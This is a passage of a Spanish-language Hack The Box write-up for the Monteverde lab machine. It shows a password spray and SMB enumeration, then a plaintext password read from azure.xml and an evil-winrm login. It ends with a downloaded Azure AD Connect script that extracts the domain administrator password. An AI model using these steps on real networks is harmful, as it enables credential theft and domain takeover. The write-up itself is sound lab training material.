+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:Guest STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:svc-ata STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:svc-bexec STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:svc-netapp STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:dgalanos STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:roleary STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:smorgan STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:Guest STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:SABatchJobs
+</code></pre></div></div>
+
+<p>Vemos que tenemos credenciales de un usuario <code class="language-plaintext highlighter-rouge">SABatchJobs : SABatchJobs</code>, así que como siempre, vamos a guardarlas y validar que recursos nos aparecen sobre SMB.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.172 <span class="nt">-U</span> <span class="s1">'SABatchJobs'</span>
+Enter WORKGROUP<span class="se">\S</span>ABatchJobs<span class="s1">'s password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        azure_uploads   Disk      
+        C$              Disk      Default share
+        E$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+        users$          Disk      
+SMB1 disabled -- no workgroup available
+❯ smbmap -H 10.10.10.172 -u '</span>SABatchJobs<span class="s1">' -p '</span>SABatchJobs<span class="s1">'
+[+] IP: 10.10.10.172:445        Name: 10.10.10.172                                      
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        azure_uploads                                           READ ONLY
+        C$                                                      NO ACCESS       Default share
+        E$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        SYSVOL                                                  READ ONLY       Logon server share 
+        users$                                                  READ ONLY
+</span></code></pre></div></div>
+
+<p>Vemos varios recursos a los cuales tenemos acceso, podríamos buscar en <strong>SYSVOL</strong> el archivo <strong>Groups.xml</strong>; sin embargo, no hay nada. En <strong>azure_uploads</strong> tampoco vemos nada, así que vamos a <strong>users$</strong> y crearnos una montura.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">mkdir</span> /mnt/smbmounted
+❯ mount <span class="nt">-t</span> cifs //10.10.10.172/users<span class="nv">$ </span>/mnt/smbmounted/ <span class="nt">-o</span> <span class="nv">username</span><span class="o">=</span>SABatchJobs,password<span class="o">=</span>SABatchJobs,domain<span class="o">=</span>WORKGROUP,rw
+❯ <span class="nb">cd</span> /mnt/smbmounted
+❯ tree
+<span class="nb">.</span>
+├── dgalanos
+├── mhope
+│   └── azure.xml
+├── roleary
+└── smorgan
+
+4 directories, 1 file
+</code></pre></div></div>
+
+<p>Vemos un archivo <code class="language-plaintext highlighter-rouge">azure.xml</code>, así que vamos a traerlo a nuestra máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cd</span> /home/k4miyo/Documentos/HTB/Monteverde/content
+❯ <span class="nb">cp</span> /mnt/smbmounted/mhope/azure.xml <span class="nb">.</span>
+❯ <span class="nb">cat </span>azure.xml
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: azure.xml   &lt;UTF-16LE&gt;
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ ﻿&lt;Objs <span class="nv">Version</span><span class="o">=</span><span class="s2">"1.1.0.1"</span> <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.microsoft.com/powershell/2004/04"</span><span class="o">&gt;</span>
+   2   │   &lt;Obj <span class="nv">RefId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>
+   3   │     &lt;TN <span class="nv">RefId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>
+   4   │       &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;
+   5   │       &lt;T&gt;System.Object&lt;/T&gt;
+   6   │     &lt;/TN&gt;
+   7   │     &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;
+   8   │     &lt;Props&gt;
+   9   │       &lt;DT <span class="nv">N</span><span class="o">=</span><span class="s2">"StartDate"</span><span class="o">&gt;</span>2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
+  10   │       &lt;DT <span class="nv">N</span><span class="o">=</span><span class="s2">"EndDate"</span><span class="o">&gt;</span>2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
+  11   │       &lt;G <span class="nv">N</span><span class="o">=</span><span class="s2">"KeyId"</span><span class="o">&gt;</span>00000000-0000-0000-0000-000000000000&lt;/G&gt;
+  12   │       &lt;S <span class="nv">N</span><span class="o">=</span><span class="s2">"Password"</span><span class="o">&gt;</span>4n0therD4y@n0th3r<span class="nv">$&lt;</span>/S&gt;
+  13   │     &lt;/Props&gt;
+  14   │   &lt;/Obj&gt;
+  15   │ &lt;/Objs&gt;
+</code></pre></div></div>
+
+<p>Aqui vemos una contraseña posiblemente asociada al usario <strong>mhope</strong>, así que vamos a validarla.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.172 <span class="nt">-u</span> <span class="s1">'mhope'</span> <span class="nt">-p</span> <span class="s1">'4n0therD4y@n0th3r$'</span>
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\m</span>hope:4n0therD4y@n0th3r<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Son válidas las credenciales que tenemos y a parte son de un usuario que se encuentra dentro del grupo <strong>Azure Admins</strong> que es lo que estábamos buscando. Regresando un poco a la captura que <code class="language-plaintext highlighter-rouge">nmap</code>, vemos que se encuentra abierto el puerto 5985, por lo que podríamos tratar de conectarnos a la máquina con <code class="language-plaintext highlighter-rouge">evil-winrm</code> y las credenciales que tenemos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-u</span> <span class="s1">'mhope'</span> <span class="nt">-p</span> <span class="s1">'4n0therD4y@n0th3r$'</span> <span class="nt">-i</span> 10.10.10.172
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>megabank<span class="se">\m</span>hope
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<p>Ya nos encontramos dentro de la máquina como el usuario <strong>mhope</strong> y podemos visualizar la flag (user.txt). Ahora, recordando que dicho usuario se encuentra dentro del grupo de dominio <strong>Azure Admins</strong>, vamos a echarle un ojo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>ocuments&gt; net user mhope
+User name                    mhope
+Full Name                    Mike Hope
+Comment
+User<span class="s1">'s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/2/2020 3:40:05 PM
+Password expires             Never
+Password changeable          1/3/2020 3:40:05 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory               \\monteverde\users$\mhope
+Last logon                   1/15/2022 5:57:03 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Azure Admins         *Domain Users
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\mhope\Documents&gt;
+*Evil-WinRM* PS C:\Users\mhope\Documents&gt; net group "Azure Admins"
+Group name     Azure Admins
+Comment
+
+Members
+
+-------------------------------------------------------------------------------
+AAD_987d7f2f57d2         Administrator            mhope
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\mhope\Documents&gt;
+</span></code></pre></div></div>
+
+<p>Vemos que el otro usuario que no podíamos ver que se encuentra dentro de dicho grupo es <strong>Administrator</strong>, vamos a echarle un ojo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>ocuments&gt; net user Administrator
+User name                    Administrator
+Full Name
+Comment                      Built-in account <span class="k">for </span>administering the computer/domain
+User<span class="s1">'s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/2/2020 2:18:38 PM
+Password expires             Never
+Password changeable          1/3/2020 2:18:38 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   1/15/2022 6:21:49 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *ADSyncAdmins
+Global Group memberships     *Domain Admins        *Azure Admins
+                             *Group Policy Creator *Domain Users
+                             *Enterprise Admins    *Schema Admins
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\mhope\Documents&gt;
+*Evil-WinRM* PS C:\Users\mhope\Documents&gt; net group "Domain Admins"
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\mhope\Documents&gt;
+</span></code></pre></div></div>
+
+<p>El usuario <strong>Administrator</strong> es el único que pertenece al grupo <strong>Domain Admins</strong>, por lo tanto, vamos a buscar un exploit que nos ayude a escalar privilegios dentro de <strong>Azure Admins</strong> y encontramos un recurso en internet <a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1">Azure-ADConnect.ps1</a>, así que lo descargamo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wget https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Azure-ADConnect.ps1
+<span class="nt">--2022-01-15</span> 19:28:27--  https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Azure-ADConnect.ps1
+Resolviendo raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
+Conectando con raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)[</span>185.199.110.133]:443... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 2264 <span class="o">(</span>2.2K<span class="o">)</span> <span class="o">[</span>text/plain]
+Grabando a: «Azure-ADConnect.ps1»
+
+Azure-ADConnect.ps1              100%[<span class="o">=======================================================&gt;]</span>   2.21K  <span class="nt">--</span>.-KB/s    en 0s      
+
+2022-01-15 19:28:27 <span class="o">(</span>48.3 MB/s<span class="o">)</span> - «Azure-ADConnect.ps1» guardado <span class="o">[</span>2264/2264]
+</code></pre></div></div>
+
+<p>Ahora lo pasamos a la máquina víctima en un diretorio donde tengamos permisos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>ocuments&gt; <span class="nb">cd </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; <span class="nb">mkdir </span>Privesc
+
+
+    Directory: C:<span class="se">\W</span>indows<span class="se">\T</span>emp
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----        1/15/2022   6:29 PM                Privesc
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; <span class="nb">cd </span>Privesc
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; upload Azure-ADConnect.ps1
+Info: Uploading Azure-ADConnect.ps1 to C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc<span class="se">\A</span>zure-ADConnect.ps1
+
+                                                             
+Data: 3016 bytes of 3016 bytes copied
+
+Info: Upload successful!
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>        1/15/2022   6:30 PM           2264 Azure-ADConnect.ps1
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
+</code></pre></div></div>
+
+<p>Ahora importamos el módulo y ejecutamos la función correspondiente.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Import-Module .<span class="se">\A</span>zure-ADConnect.ps1
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Azure-ADConnect <span class="nt">-server</span> 10.10.10.172 <span class="nt">-db</span> ADSync
+<span class="o">[</span>+] Domain:  MEGABANK.LOCAL
+<span class="o">[</span>+] Username: administrator
+<span class="o">[</span>+]Password: d0m@in4dminyeah!
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
+</code></pre></div></div>
+
+<p>Tenemos la contraseña del usuario <strong>Administrator</strong> y como siempre, vamos a guardar las credenciales y validar con <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.172 <span class="nt">-u</span> <span class="s1">'administrator'</span> <span class="nt">-p</span> <span class="s1">'d0m@in4dminyeah!'</span>
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\a</span>dministrator:d0m@in4dminyeah! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Son válidas, asi que ahora podemos conectarnos a la máquina ya como el usuario <strong>Administartor</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-u</span> <span class="s1">'administrator'</span> <span class="nt">-p</span> <span class="s1">'d0m@in4dminyeah!'</span> <span class="nt">-i</span> 10.10.10.172
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>megabank<span class="se">\a</span>dministrator
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<p>Ya podemos visualizar la flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#active-directory" class="page__taxonomy-item" rel="tag">Active_Directory</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#file-misconfiguration" class="page__taxonomy-item" rel="tag">File_Misconfiguration</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#powershell" class="page__taxonomy-item" rel="tag">Powershell</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-01-15T00:00:00-06:00">January 15, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-resolute/" class="pagination--pager" title="Hack The Box Resolute
+">Previous</a>
+    
+    
+      <a href="/htb-nest/" class="pagination--pager" title="Hack The Box Nest
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
